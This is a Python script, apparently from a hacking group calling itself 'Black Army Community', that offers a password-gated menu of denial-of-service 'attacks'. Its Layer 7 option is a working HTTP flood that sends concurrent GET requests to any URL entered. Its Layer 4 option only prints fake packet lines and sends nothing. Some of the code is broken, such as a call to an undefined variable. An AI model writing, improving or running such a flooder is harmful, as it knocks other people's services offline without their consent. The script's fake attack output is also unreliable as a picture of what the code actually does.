#!usr/bin/python3.12
# _*_ coding: utf-8 _*_
import aiohttp
import asyncio
import time
import os
import random
import sys
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")
    
# ============================
#   Typing Animation
# ============================
def typewriter(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print(massage)  # newline

# ============================
#   Banner ASCII
# ============================
def display_header():
    header_lines = [
    Fore.YELLOW + "▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒",  
    Fore.YELLOW + "▒▒▒████═╗▒█═╗▒▒▒█═╗▒███═╗▒███═╗▒▒▒███═╗▒▒▒█═╗▒▒▒█═╗▒▒▒███═╗▒▒▒▒▒",
    Fore.YELLOW + "▒▒▒█ ╔══╝▒█ ║▒▒▒█ ║▒█▒█ ╚═█▒█ ║▒▒█ ╔═█ ╚╗▒█ ║▒▒▒█ ║▒▒█ ╔═█ ╚╗▒▒▒",
    Fore.YELLOW + "▒▒▒█ ║▒▒▒▒█ ║▒▒▒█ ║▒█ ║███ ▒█ ║▒█ ╔╝▒▒█ ║▒█ ║▒▒▒█ ║▒█ ╔╝▒▒█ ║▒▒▒",
    Fore.YELLOW + "▒▒▒█ ║▒▒▒▒█ ║▒▒▒█ ║▒█ ║▒█ ║▒█ ║▒█ ║▒▒▒█ ║▒█ ║▒▒▒█ ║▒█ ║▒▒▒█ ║▒▒▒",
    Fore.YELLOW + "▒▒▒████═╗▒█ ║▒▒▒█ ║▒█ ║▒█ ║▒█ ║▒█ ║▒▒▒█ ║▒▒█████ ╔╝▒█ ║▒▒▒█ ║▒▒▒",
    Fore.YELLOW + "▒▒▒╚══█ ║▒█ ║▒▒▒█ ║▒█ ║▒█ ║▒█ ║▒███████ ║▒▒╚═█ ╔╝▒▒▒███████ ║▒▒▒",
    Fore.YELLOW + "▒▒▒████ ║▒▒█████ ╔╝▒█ ║▒█ ║▒█ ║▒█ ╔═══█ ║▒▒▒▒█ ║▒▒▒▒█ ╔═══█ ║▒▒▒",
    Fore.YELLOW + "▒▒▒╚════╝▒▒╚═════╝▒▒╚═╝▒╚═╝▒╚═╝▒╚═╝▒▒▒╚═╝▒▒▒▒╚═╝▒▒▒▒╚═╝▒▒▒╚═╝▒▒▒",
    Fore.YELLOW + "▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒",  
    ]
    for line in header_lines:
        print(line)  
    time.sleep(0.0015)  # typing effect
# ============================
#   Layer 4 Stress Tes
# ============================
def layer4_attack(target_ip, duration):
    print(Fore.RED + f"\n[🔥] Starting Layer 4 attack to {target_ip} for {duration} seconds...\n")
    start_time = time.time()
    while time.time() - start_time < duration:
        port = random.randint(20, 65535)
        psize = random.randint(64, 1500)
        print(Fore.WHITE + f"[L4] \033[48;5;7m\033[38;5;0mIp address\033[0m\033[32m {target_ip} \033[95mport\033[37m: \033[33m{port} \033[32minfo_size: \033[38;5;3m{psize}")
        print(Fore.YELLOW + f"[L4] \033[37mIp address\033[38;5;3m {target_ip} \033[37mport\033[37m: \033[37m{port} \033[33minfo_size: \033[37m{psize}")
        time.sleep(0.2)
    print(Fore.GREEN + "\n[✔] Layer 4 attack finished!\n")

# ============================
#   Layer 7 Stress Test
# ============================
async def worker(session, url, stop_time):
    hits = 0
    while time.time() < stop_time:
        try:
            async with session.get(url) as resp:
                await resp.text()
                hits += 1
                print(Fore.RED + f"[L7] \033[101m\033[97mInfo target\033[0m \033[33m:{url} \033[38;5;39mnum_attack \033[21m{hits}")
                print(Fore.WHITE + f"[L7] \033[38;5;206mInfo target \033[97m:{url} \033[32mAttack Running")
        except:
            print(Fore.RED + f"[L7] Request failed -> {url} 🇵🇸")
    return hits

async def layer7_attack(url, concurrency, duration):
    stop_time = time.time() + duration
    async with aiohttp.ClientSession() as session:
        tasks = [worker(session, url, stop_time) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
    print(Fore.GREEN + f"\n[✔] Total requests sent: {sum(results)}")

# ============================
#   Menu Utama
# ============================
def main():
    attemps = 0
    os.system("clear")
    display_header()
    print(f"\r\033[97m╔{'═' * 62}╗")
    print(f"\r\033[97m║\033[48;5;7m\033[30m                     Developer: KunFayz{' ' * 23}\033[97m\033[0m║")
    print(f"\r\033[97m║\033[48;5;7m\033[30m                   Adm: zblack@gmail.com{' ' * 22}\033[97m\033[0m║") 
    print(f"\r\033[97m║\033[48;5;7m\033[30m              Exclusively Black Army Community{' ' * 16}\033[97m\033[0m║")
    print(f"\r\033[97m╚{'═' * 62}╝")
    while attemps < 100:
        print("\033[32m┏━━KunFayz━━⬣")
        username = input("\033[32m┗> Enter your username: \033[30m")
        password = input("\033[32m┗> Enter your password: \033[30m")

        if username == 'nol' and password == 'satu':
            print("\033[100m \033[97mZ0NA ATTACK BLACK ARMY•••!!\033[0m")
            break
        else:
            print('Incorrect credentials. Check if you have Caps lock on and try again.')
            attemps += 1
            continue

    print(Fore.CYAN + "┏━━KunFayz━━⬣")
    print(Fore.CYAN + "┗> " + Fore.YELLOW + "1. Layer 4 Attack")
    print(Fore.CYAN + "┗> " + Fore.YELLOW + "2. Layer 7 HTTP Attack")
    choice = input("\033[97m•••> Select option: \033[0m")

    if choice == "1":
        print(Fore.CYAN + "┏━━KunFayz━━⬣")
        target_ip = input(Fore.CYAN + "┗> Target IP: ")
        duration = int(input(Fore.CYAN + "┗> Duration (seconds): "))
        layer4_attack(target_ip, duration)

    elif choice == "2":
        print(Fore.CYAN + "┏━━KunFayz━━⬣")
        url = input(Fore.CYAN + "┗> Target URL: ")
        concurrency = int(input(Fore.CYAN + "┗> Concurrent connections: "))
        duration = int(input(Fore.CYAN + "┗> Duration (seconds): "))
        asyncio.run(layer7_attack(url, concurrency, duration))

    else:
        print(Fore.RED + "\n[!] Invalid choice.")

if __name__ == "__main__":
    main()
